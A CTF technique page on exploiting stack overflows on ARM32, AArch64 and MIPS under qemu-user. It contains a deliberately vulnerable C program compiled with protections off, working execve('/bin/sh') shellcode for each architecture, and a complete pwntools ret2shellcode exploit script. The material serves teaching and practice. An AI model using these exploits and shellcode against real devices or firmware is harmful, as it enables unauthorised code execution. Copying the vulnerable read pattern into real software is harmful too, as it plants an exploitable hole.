---
title: "Cross-Architecture Pwn - ARM32, AArch64 and MIPS"
category: pwn
subcategory: cross-arch
type: technique
tags: [arm, aarch64, mips, mipsel, thumb, qemu, gdb-multiarch, shellcode, execve, branch-delay-slot, cross-compile, execstack, nx, canary, rop, ret2libc, pwntools, objdump, checksec, gef]
difficulty: hard
summary: "Overflow and shellcode on ARM/AArch64/MIPS: lr and x30 instead of saved eip, svc #0 vs syscall, delay slots, cross-gcc plus qemu-user and gdb-multiarch."
when_to_use:
  - "file ./chal says ARM, aarch64, or MIPS instead of x86-64"
  - "The challenge ships a router/IoT firmware binary or a qemu run script"
  - "Your x86 muscle memory breaks: there is no saved return address on the stack yet"
  - "You need shellcode for an architecture pwntools shellcraft covers but you have never used"
  - "You must debug a foreign-arch binary on an amd64 box"
tools: [pwntools, qemu-user, gdb-multiarch, gef, pwndbg, objdump, readelf, checksec, ropgadget, ropper, binwalk]
related: [shellcode-crafting, shellcode-ret2shellcode, shellcode-seccomp-orw, stack-buffer-overflow-basics, stack-ret2win, rop-fundamentals, rop-ret2libc, mitigation-modern-playbook, mitigation-libc-identification]
---

## TL;DR

The bug class is identical - a stack buffer overflow is a stack buffer overflow - but the
machine is not. RISC CPUs return through a **link register** (`lr`/`r14` on ARM32, `x30` on
AArch64, `$ra`/`$31` on MIPS), which only reaches the stack when the function spills it. Get
the spill offset right, put shellcode somewhere executable, and overwrite the saved link
register. `qemu-user` plus `gdb-multiarch` gives you the whole loop on an amd64 laptop.

## Recognise it

- `file ./chal` -> `ELF 32-bit LSB executable, ARM, EABI5`, `ELF 64-bit ... ARM aarch64`,
  or `ELF 32-bit MSB executable, MIPS, MIPS32`; `readelf -h | grep Machine` agrees.
- The handout includes a `run.sh` with `qemu-arm -L ...` or a `Dockerfile` with `qemu-user-static`.
- Firmware/router challenges: `binwalk` extracted a squashfs full of MIPS binaries.
- Disassembly is full of `bl`, `bx lr`, `ldmia sp!, {..., pc}`, `svc`, or `jr $ra` / `nop` pairs.

## Vulnerable source

```c
/* vuln.c - one source, three architectures */
#include <stdio.h>
#include <unistd.h>

int main(void) {
    char buf[128];
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("buf @ %p\n", (void *)buf);
    printf("input: ");
    read(0, buf, 512);           /* 512 >> 128 */
    puts("done");
    return 0;
}
```

Cross-compilers (Debian/Ubuntu package names in the comments):

```sh
# gcc-arm-linux-gnueabihf
arm-linux-gnueabihf-gcc -static -fno-stack-protector -z execstack -O0 -o vuln_arm vuln.c
# gcc-aarch64-linux-gnu
aarch64-linux-gnu-gcc  -static -fno-stack-protector -z execstack -O0 -o vuln_arm64 vuln.c
# gcc-mips-linux-gnu (big endian) / gcc-mipsel-linux-gnu (little endian)
mips-linux-gnu-gcc     -static -fno-stack-protector -z execstack -O0 -o vuln_mips   vuln.c
mipsel-linux-gnu-gcc   -static -fno-stack-protector -z execstack -O0 -o vuln_mipsel vuln.c
# Dynamic build: qemu then needs -L <sysroot> to find the loader and libs
arm-linux-gnueabihf-gcc -fno-stack-protector -z execstack -O0 -o vuln_arm_dyn vuln.c
```

Run them under qemu-user (`qemu-user-static` provides all four binaries):

```sh
qemu-arm      -L /usr/arm-linux-gnueabihf  ./vuln_arm_dyn
qemu-aarch64  -L /usr/aarch64-linux-gnu    ./vuln_arm64
qemu-mips     -L /usr/mips-linux-gnu       ./vuln_mips
qemu-mipsel   -L /usr/mipsel-linux-gnu     ./vuln_mipsel

# qemu-user randomises the stack too; turn it off while you find offsets
setarch -R qemu-arm -L /usr/arm-linux-gnueabihf ./vuln_arm
```

Debug them - terminal 1 runs qemu with `-g`, terminal 2 attaches:

```sh
qemu-arm -L /usr/arm-linux-gnueabihf -g 1234 ./vuln_arm

gdb-multiarch -q ./vuln_arm \
  -ex 'set architecture arm' -ex 'set sysroot /usr/arm-linux-gnueabihf' \
  -ex 'target remote :1234' -ex 'b *main' -ex 'c'
# aarch64: set architecture aarch64     mips: set architecture mips:isa32r2
# gef and pwndbg both work over this connection; 'vmmap' shows qemu's guest maps.
```

## Theory

### Calling conventions at a glance

| | ARM32 (EABI) | AArch64 | MIPS o32 |
|---|---|---|---|
| args | `r0-r3`, then stack | `x0-x7`, then stack | `$a0-$a3` (`$4-$7`), then stack |
| return value | `r0` | `x0` | `$v0` (`$2`); `$a3` = error flag |
| return address | `lr` = `r14` | `x30` (aka `lr`) | `$ra` = `$31` |
| syscall number | `r7` | `x8` | `$v0` |
| syscall insn | `svc #0` (EABI) / `swi 0x900000+nr` (OABI) | `svc #0` | `syscall` |
| stack pointer | `sp` = `r13` | `sp` | `$sp` = `$29` |
| frame pointer | `fp` = `r11` (or `r7` in Thumb) | `x29` | `$fp` = `$30` |
| alignment | 8 | **16** (SP must be 16-aligned) | 8 |

| syscall | ARM32 | AArch64 | MIPS o32 |
|---|---|---|---|
| `read` | 3 | 63 | 4003 |
| `write` | 4 | 64 | 4004 |
| `open` | 5 | *(absent)* | 4005 |
| `openat` | 322 | 56 | 4288 |
| `execve` | 11 | 221 | 4011 |
| `mprotect` | 125 | 226 | 4125 |
| `exit` | 1 | 93 | 4001 |

AArch64 uses the "generic" table: **there is no `open`**, only `openat(AT_FDCWD, ...)`.
MIPS o32 numbers are offset by 4000 (`__NR_Linux`); n32 starts at 6000, n64 at 5000.

### Where the return address lives

- **ARM32.** A leaf function keeps the return address in `lr` and ends with `bx lr` -
  overflowing its locals gives you *nothing*. A non-leaf function emits `push {r11, lr}` on
  entry and `pop {r11, pc}` on exit, so the saved `lr` sits just above the locals; with
  `-O0` and `char buf[128]` the offset is usually 132 or 136. Confirm with `cyclic`.
- **AArch64.** The prologue `stp x29, x30, [sp, #-N]!` stores the frame pointer and link
  register at the **bottom** of the frame, with locals *above* them, so a forward overflow
  walks away from this frame's `x30` and lands in the **caller's** saved `x29/x30` - the
  single biggest gotcha coming from x86. `ldp x29, x30, [sp], #N ; ret` then returns into it.
- **MIPS.** `$ra` is spilled with `sw $ra, N($sp)` near the **top** of the frame, above the
  locals, so a forward overflow reaches it just like x86 (`lw $ra, N($sp); jr $ra; nop`).

### Thumb mode

ARM32 has two instruction sets in one core: 32-bit ARM and 16-bit Thumb, selected by
**bit 0 of the branch target**. `bx r3` with `r3 & 1` enters Thumb, otherwise ARM - so
`0xbefff004` runs as ARM and `0xbefff005` runs the *same bytes* as Thumb. Thumb encodings
are half the size and easier to keep free of `0x00`.

```asm
@ arm_thumb_sh.S - ARM32 execve("/bin/sh", NULL, NULL), Thumb body, null-free
.section .text
.global _start
.code 32
_start:
    add  r3, pc, #1         @ r3 = &thumb_start | 1
    bx   r3                 @ interworking branch -> Thumb state
.code 16
    adr  r0, binsh          @ r0 = &"/bin/sh"   (adr needs a 4-byte aligned label)
    subs r1, r1, r1         @ r1 = 0  -> argv = NULL
    subs r2, r2, r2         @ r2 = 0  -> envp = NULL
    movs r7, #11            @ __NR_execve
    svc  #1                 @ df 01 - '#1' avoids the 0x00 in 'svc #0' (df 00)
.align 2
binsh:
    .asciz "/bin/sh"
```

The plain ARM-state version is the same five instructions with `adr r0, binsh`,
`eor r1, r1, r1`, `eor r2, r2, r2`, `mov r7, #11`, `svc #0`.

### AArch64 shellcode

```asm
// arm64_sh.S - execve("/bin/sh", NULL, NULL)
.section .text
.global _start
_start:
    adr  x0, binsh          // x0 = &"/bin/sh"  (adr is PC-relative, +/-1MB)
    mov  x1, xzr            // argv = NULL
    mov  x2, xzr            // envp = NULL
    mov  x8, #221           // __NR_execve
    svc  #0
binsh:
    .asciz "/bin/sh"
```

AArch64 instructions are fixed 4 bytes and frequently contain `0x00`, so "null-free"
is usually impossible - fortunately most AArch64 challenges feed you bytes through `read`.

### MIPS shellcode and the branch delay slot

MIPS executes **the instruction after a branch or jump before the branch takes effect**.
`jr $ra ; nop` really means "the `nop` runs, then we jump". So: ROP/return targets must
account for the delay-slot instruction that will execute; `bal` (branch-and-link) is the
standard way to get a PC-relative address, since pre-R6 MIPS has no `adr`; and you must
assemble with `.set noreorder`, or the assembler shuffles your instructions into delay slots.

```asm
# mips_sh.S - o32 execve("/bin/sh", NULL, NULL)
    .set noreorder
    .text
    .globl __start
__start:
    bal   next               # $ra = address of 'next' (the insn after the delay slot)
    nop                      # <- delay slot, executes before the branch
next:
    addiu $a0, $ra, 20       # $a0 = &"/bin/sh" (5 instructions * 4 bytes past $ra)
    slti  $a1, $zero, -1     # $a1 = (0 < -1) = 0  -> argv = NULL, and null-free
    slti  $a2, $zero, -1     # $a2 = 0             -> envp = NULL
    li    $v0, 4011          # __NR_execve
    syscall
    .asciz "/bin/sh"
```

Also note: MIPS returns errors in `$a3` (0 = success) rather than a negative `$v0`, and MIPS
caches are **not** coherent - on real hardware, self-modifying shellcode needs `cacheflush(2)`
(4147) or it may execute stale bytes. ARM has the same problem (`__clear_cache`, syscall
`0xf0002`). `qemu-user` handles it for you, which is exactly why exploits that work in qemu
sometimes fail on the real device.

## Attack

1. `file`, `readelf -h`, `checksec` - architecture, endianness, NX, PIE, canary.
2. Build the run command: `qemu-<arch> -L /usr/<triplet> ./chal`. Verify it runs at all.
3. Find the offset: send `cyclic(400)`, catch the crash in gdb-multiarch, then `cyclic -l`
   the value in `pc` (ARM/AArch64) or `$ra` (MIPS). Mind the AArch64 parent-frame quirk.
4. Decide where the code goes. `-z execstack` -> straight ret2shellcode onto the leaked
   `buf`. NX on -> `mprotect` ROP (same idea as x86-64, different gadgets), or ret2libc
   with `system` - on ARM32 the first argument is `r0`, so you need a `pop {r0, pc}` gadget.
5. Assemble with `context.arch = 'arm' | 'thumb' | 'aarch64' | 'mips'` plus
   `context.endian = 'big'` for big-endian MIPS. For Thumb, **set bit 0 of the target**.
6. Send, `interactive()`.

## Exploit

```python
#!/usr/bin/env python3
"""ret2shellcode on ARM32 / AArch64 / MIPS under qemu-user.

Usage: python3 exploit.py ARCH=arm|aarch64|mips|mipsel [GDB] [REMOTE HOST=.. PORT=..]
"""
from pwn import *

# name: (binary, arch, bits, endian, qemu argv, offset to saved link register, thumb)
PROFILES = {
    "arm":     ("./vuln_arm",    "arm",     32, "little",
                ["qemu-arm", "-L", "/usr/arm-linux-gnueabihf"],   132, True),
    "aarch64": ("./vuln_arm64",  "aarch64", 64, "little",
                ["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu"], 152, False),
    "mips":    ("./vuln_mips",   "mips",    32, "big",
                ["qemu-mips", "-L", "/usr/mips-linux-gnu"],       144, False),
    "mipsel":  ("./vuln_mipsel", "mips",    32, "little",
                ["qemu-mipsel", "-L", "/usr/mipsel-linux-gnu"],   144, False),
}

SLED = 0x80

# Thumb keeps the ARM32 payload small and mostly null-free; 'svc #1' avoids the
# 0x00 byte that 'svc #0' (df 00) would introduce.
THUMB_SH = 'adr r0, binsh; subs r1, r1, r1; subs r2, r2, r2; movs r7, #11; svc #1;' \
           ' .align 2; binsh: .asciz "/bin/sh"'


def shellcode(arch, thumb):
    """Assemble execve('/bin/sh') for the selected architecture."""
    return asm(THUMB_SH, arch="thumb") if thumb else asm(getattr(shellcraft, arch).linux.sh())


def sled_bytes(thumb):
    """A landing pad made of real no-ops for the target ISA."""
    return asm("nop", arch="thumb") * (SLED // 2) if thumb else asm("nop") * (SLED // 4)


def main():
    name = args.ARCH or "arm"
    if name not in PROFILES:
        log.error("ARCH must be one of %s", ", ".join(PROFILES))
    binary, arch, bits, endian, qemu, offset, thumb = PROFILES[name]

    context.clear()
    context.arch, context.bits, context.endian, context.os = arch, bits, endian, "linux"

    sc = shellcode(arch, thumb)
    sled = sled_bytes(thumb)
    log.info("%s shellcode: %d bytes\n%s", name, len(sc),
             disasm(sc, arch="thumb" if thumb else arch))

    # args.GDB adds -g 1234 so gdb-multiarch can attach (see Tools).
    io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337)) if args.REMOTE
          else process(qemu + (["-g", "1234"] if args.GDB else []) + [binary]))

    io.recvuntil(b"buf @ ")
    buf = int(io.recvline().strip(), 16)
    log.success("buf @ %#x", buf)

    target = buf + len(sled) // 2
    if thumb:
        target |= 1                      # bit 0 selects Thumb state on the branch
    log.info("jumping to %#x", target)

    body = sled + sc
    if len(body) > offset:
        log.error("payload (%d) longer than the offset (%d)", len(body), offset)

    io.recvuntil(b"input: ")
    io.send(body.ljust(offset, b"A") + pack(target, word_size=bits))
    io.sendline(b"id; cat flag*")
    io.interactive()


if __name__ == "__main__":
    main()
```

A tiny harness for finding the offset and sanity-checking the toolchain:

```python
#!/usr/bin/env python3
"""Crash the target under qemu with a cyclic pattern and report the offset."""
from pwn import *

QEMU = {
    "arm":     (["qemu-arm", "-L", "/usr/arm-linux-gnueabihf"], "./vuln_arm"),
    "aarch64": (["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu"], "./vuln_arm64"),
    "mips":    (["qemu-mips", "-L", "/usr/mips-linux-gnu"], "./vuln_mips"),
}


def main():
    name = args.ARCH or "arm"
    context.clear()
    context.arch = name
    context.bits = 64 if name == "aarch64" else 32
    context.endian = "big" if name == "mips" else "little"

    qemu, binary = QEMU[name]
    pattern = cyclic(400, n=context.bytes)

    io = process(qemu + [binary])
    io.recvuntil(b"buf @ ")
    log.info("buf @ %s", io.recvline().strip().decode())
    io.recvuntil(b"input: ")
    io.send(pattern)
    io.wait(timeout=5)
    log.info("exit code / signal: %s", io.poll(block=True))
    log.info("Reproduce under gdb-multiarch, then: cyclic -l $pc  (arm / aarch64 - the "
             "aarch64 crash uses the CALLER's saved x30) or cyclic -l $ra (mips)")

    # Resolve a value you read out of the debugger: exploit.py ARCH=mips PC=0x61616163
    if args.PC:
        needle = pack(int(args.PC, 16), word_size=context.bits)
        log.success("offset = %d", cyclic_find(needle, n=context.bytes))


if __name__ == "__main__":
    main()
```

## Variants & pitfalls

- **Endianness.** Big-endian MIPS (`mips`) and little-endian (`mipsel`) are different
  targets. Set `context.endian = 'big'` or every pointer you pack is byte-reversed.
- **The AArch64 frame layout** is the classic first-timer trap: overflowing a local buffer
  reaches the *caller's* saved `x29/x30`. Confirm with `cyclic -l $pc`, never by hand.
- **Thumb bit.** Forgetting `| 1` gives an immediate SIGILL and nonsense disassembly;
  `set arm force-mode thumb` in gdb to read it properly.
- **ARM32 ROP needs `pop {r0, pc}`** style gadgets - `ROPgadget --binary ./vuln_arm` finds
  plenty in a static binary; `ropper --search 'ldp x29, x30'` is the AArch64 equivalent.
- **qemu-user is not the device.** Coherent caches, a different stack layout and its own
  view of `/proc/self/maps` mean qemu offsets often need re-deriving against the remote.
- **`-z execstack` on AArch64** is honoured by Linux, but hardened kernels and W^X-enforcing
  hypervisors refuse it. Fall back to `mprotect` (`x8 = 226`) or an `mmap`ed RWX page.
- **MIPS `$ra` may not be spilled** in leaf functions, exactly like ARM's `lr`. Overflow the
  caller instead, or target a saved register (`$s0-$s7`) later used as a jump target.
- **MIPS NULL bytes.** `li $v0, 4011` assembles to `ori $v0, $zero, 0xfab` - clean - but any
  `lui`/`addiu` with a small immediate carries zero bytes; prefer `slti`, `xor`, `bal`.
- **seccomp on these arches** uses `AUDIT_ARCH_ARM` (0x40000028), `AUDIT_ARCH_AARCH64`
  (0xc00000b7), `AUDIT_ARCH_MIPS` (0x00000008). See `shellcode-seccomp-orw`.

## Tools

```sh
# Identify
file ./chal && readelf -hW ./chal | grep -E 'Machine|Data|Type' && checksec --file=./chal

# Toolchains (Debian/Ubuntu)
sudo apt install gcc-arm-linux-gnueabihf gcc-aarch64-linux-gnu gcc-mips-linux-gnu \
                 gcc-mipsel-linux-gnu qemu-user-static gdb-multiarch binutils-multiarch

# Disassemble foreign binaries
arm-linux-gnueabihf-objdump -d ./vuln_arm | less
mips-linux-gnu-objdump -d -EB ./vuln_mips | less
objdump -D -b binary -m arm -M force-thumb sc.bin      # raw thumb blob

# Assemble standalone shellcode
arm-linux-gnueabihf-as arm_sh.S -o arm_sh.o
arm-linux-gnueabihf-objcopy -O binary arm_sh.o arm_sh.bin
pwn asm --context=arm 'mov r7, #11; svc #0'
pwn asm --context=thumb 'movs r7, #11; svc #1'
pwn shellcraft -f hex arm.linux.sh          # also aarch64.linux.sh, mips.linux.sh

# Run + debug
qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./vuln_arm64 &
gdb-multiarch -q ./vuln_arm64 -ex 'set architecture aarch64' -ex 'target remote :1234'

# Gadgets + firmware
ROPgadget --binary ./vuln_arm --thumb
binwalk -Me firmware.bin
```
